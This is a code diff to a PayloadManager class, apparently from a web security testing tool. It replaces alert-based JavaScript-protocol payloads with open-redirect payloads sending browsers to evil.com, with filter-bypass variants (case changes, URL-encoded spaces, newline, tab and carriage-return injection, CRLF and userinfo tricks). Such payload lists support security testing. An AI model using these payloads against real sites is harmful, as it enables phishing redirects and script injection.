@@ -134,8 +134,7 @@ class PayloadManager:
             "http://evil.com%0d%0a",
             "http://evil.com\r\n",
             
-            # JavaScript protocol
-            "javascript:alert('XSS')",
+            # JavaScript protocol (for open redirect testing)
             "javascript:window.location='http://evil.com'",
             
             # Data protocol
@@ -251,15 +250,15 @@ class PayloadManager:
             
 
             
-            # Advanced JavaScript protocol bypasses for DOM-based redirects
-            "JavaScript:alert(1)",               # case variation
-            "JAVASCRIPT:alert(1)",               # uppercase
-            "ja%20vascri%20pt:alert(1)",         # URL-encoded spaces
-            "jav%0Aascri%0Apt:alert(1)",         # newline injection
-            "jav%0Dascri%0Dpt:alert(1)",         # carriage return injection
-            "jav%09ascri%09pt:alert(1)",         # tab injection
-            "%19javascript:alert(1)",            # advanced regex bypass
-            "javascript://%0Aalert(1)",          # newline comment bypass
+            # Advanced JavaScript protocol bypasses for DOM-based open redirects
+            "JavaScript:window.location='http://evil.com'",               # case variation
+            "JAVASCRIPT:window.location='http://evil.com'",               # uppercase
+            "ja%20vascri%20pt:window.location='http://evil.com'",         # URL-encoded spaces
+            "jav%0Aascri%0Apt:window.location='http://evil.com'",         # newline injection
+            "jav%0Dascri%0Dpt:window.location='http://evil.com'",         # carriage return injection
+            "jav%09ascri%09pt:window.location='http://evil.com'",         # tab injection
+            "%19javascript:window.location='http://evil.com'",            # advanced regex bypass
+            "javascript://%0Awindow.location='http://evil.com'",          # newline comment bypass
             
             # Userinfo bypasses (@ character tricks)
             "http://legitapp.com@evil.com",       # userinfo bypass
